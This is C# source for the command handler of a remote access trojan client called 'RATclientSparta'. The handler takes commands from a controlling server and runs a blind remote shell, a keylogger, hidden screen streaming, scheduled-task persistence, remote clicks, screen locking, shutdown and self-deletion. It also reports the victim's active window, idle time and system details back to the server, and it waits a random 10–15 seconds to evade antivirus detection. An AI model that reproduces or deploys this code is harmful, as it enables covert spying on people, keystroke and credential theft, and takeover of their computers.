using System;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Speech.Synthesis;
using System.Windows.Forms;
using RATclientSparta.Tools;
using RATclientSparta.Tools.ScreenShare;
using RATclientSparta.Tools.Chat;
using SpartaRATclient.Tools;
using SpartaRATclient;
using RATclientSparta.Setup.RegistryData;
using RATclientSparta.Tools.Screen;
using System.Drawing;

namespace RATclientSparta.Server
{
    public class ServerData
    {
        public delegate void GotMessage(byte[] message);
        public delegate void LostConnection();
        public delegate void screenStreamEvent();
        public delegate void paintStreamEvent(byte[] message);
        public delegate void PaintConfig(byte[] message);

        public event GotMessage MessageEvent;
        public event LostConnection LostConnectionEvent;
        public event screenStreamEvent CloseScreenStream;
        public event paintStreamEvent PaintStream;
        public event PaintConfig PaintConfigs;

        public System.Net.Sockets.Socket SocketConnection;
        public bool ServerConnected = false;
        private SendData Data;

        public ServerData(System.Net.Sockets.Socket ServerSocket)
        {
            this.MessageEvent = delegate { };
            this.LostConnectionEvent = delegate { };
            this.CloseScreenStream = delegate { };
            this.PaintStream = delegate { };
            this.PaintConfigs = delegate { };
            this.SocketConnection = ServerSocket;
            this.ServerConnected = true;
        }
        public void Receive()
        {
            this.Data = new SendData(this.SocketConnection);
            new Thread(() => { this.updateServerValues(); }).Start();
            ReadData ClientRead = new ReadData(this.SocketConnection);

            while (ServerConnected)
            {
                try
                {
                    //server must send 6 bytes - Therefore client know to expect for 6 bytes.
                    byte[] tlv = ClientRead.Read(6);

                    //index 0 = type
                    byte type = tlv[0];

                    //index 1-6 = length
                    int lengthRead = BitConverter.ToInt32(tlv, 1);

                    //reading from server according to the Int32 bit value (from index 1-6)
                    byte[] message = ClientRead.Read(lengthRead);

                    switch (type)
                    {
                        //Connection test
                        case 0: break;

                        //chat (Message Received)
                        case 1: MessageEvent.Invoke(message); break;

                        //chat (Opening GUI screen)
                        case 2: if (Application.OpenForms.OfType<Chat>().Count() == 0) { new Thread(new ThreadStart(() => { Chat chat = new Chat(this); chat.ShowDialog(); })).Start(); } break;

                        //computer Talk
                        case 4: string a = Encoding.ASCII.GetString(message); SpeechSynthesizer synth = new SpeechSynthesizer(); synth.SetOutputToDefaultAudioDevice(); synth.Speak(a); break;

                        //exit program
                        case 7: Data.Send(Encoding.ASCII.GetBytes("\0"), 0); Environment.Exit(0); break;

                        //screen Stream - Opening the hidden GUI of screen share. (small resolution TopMost GUI window so it will work even when playing on fullscreen games)
                        case 8: if (Application.OpenForms.OfType<ScreenShare>().Count() == 0) { new Thread(new ThreadStart(() => { ScreenShare ShareScreen = new ScreenShare(this, SocketConnection); ShareScreen.ShowDialog(); })).Start(); } break;

                        //screen Stream - delegate event that stops the screen streaming
                        case 9: CloseScreenStream.Invoke(); break;

                        //Paint delegate X,Y,Location - on screen
                        case 10: PaintStream.Invoke(message); break;

                        //persistence
                        case 20: new Thread(new ThreadStart(() => { schtask.Create(); })).Start(); break;

                        //Clicking on screen
                        case 22: Click click = new Click(); click.ScreenClick(message); break;

                        //Delete app
                        case 23: Data.Send(Encoding.ASCII.GetBytes("\0"), 0); CurrentApp.Delete(); break;

                        //Blind Shell
                        case 13: Shell.Run(Encoding.ASCII.GetString(message), 5); break;

                        //Computer shutdown
                        case 14: Shell.Run(@"shutdown /s /t 1", 0); break;

                        //Creating registry value For the Screen lock in registry
                        case 24: RegistryCreate.Create("ScreenLock", Encoding.ASCII.GetString(message)); ScreenBlock.CheckIfLockRequired(); break;

                        case 25: new Thread(() => { Keylogger k = new Keylogger(this.Data,this); k.Start(); }).Start(); break;

                        //Adding default value for security reasons
                        default: break;
                    }
                }
                catch { break; }
            }
            this.SocketConnection.Close();
            LostConnectionEvent.Invoke();
            return; //returning - not connected
        }

        private void updateServerValues()
        {
            //Sending screen resolution
            Rectangle resolution = Screen.PrimaryScreen.Bounds;
            this.Data.Send(Encoding.ASCII.GetBytes(resolution.ToString()), 21);

            this.Data.Send(Encoding.ASCII.GetBytes("loading"), 2); //Idle time
            this.Data.Send(Encoding.ASCII.GetBytes("loading"), 3); //Current Window
            this.Data.Send(Encoding.ASCII.GetBytes("0.0.0.0"), 5); //Ipaddress
            this.Data.Send(Encoding.ASCII.GetBytes("Israel"), 6); //Country
            this.Data.Send(Encoding.ASCII.GetBytes("Administrator"), 17); //running as Admin or User?
            this.Data.Send(Encoding.ASCII.GetBytes("loading"), 16); //Windows Version and Type
            this.Data.Send(Encoding.ASCII.GetBytes("loading"), 19); //Opening date

            //Long sleep to evade AV's
            Random rand = new Random();
            Thread.Sleep(rand.Next(10000, 15000));

            //Getting registry data
            RegistryGet item = new RegistryGet();

            //Sending the registry data
            this.Data.Send(Encoding.ASCII.GetBytes(item.OSVersion), 16); //Windows Version and Type
            this.Data.Send(Encoding.ASCII.GetBytes(item.OpenedDate), 19); //Opening date
            //Setting default values
            string prevIdleTime = "-1";
            string prevCurrentOpenedTab = "null";

            //Loop that sends current open window and Idle time
            while (this.ServerConnected)
            {
                if (!((IdleTime.GetIdleTime() / 1000).ToString() == prevIdleTime))
                {
                    prevIdleTime = (IdleTime.GetIdleTime() / 1000).ToString();
                    this.Data.Send(Encoding.ASCII.GetBytes((IdleTime.GetIdleTime() / 1000).ToString()), 2);
                }

                CurrentOpenWindow Get = new CurrentOpenWindow();
                if (!(Get.CurrentWindow() == prevCurrentOpenedTab))
                { prevCurrentOpenedTab = Get.CurrentWindow(); this.Data.Send(Encoding.ASCII.GetBytes(Get.CurrentWindow()), 3); }

                Thread.Sleep(1000);
            }
        }
    }
}
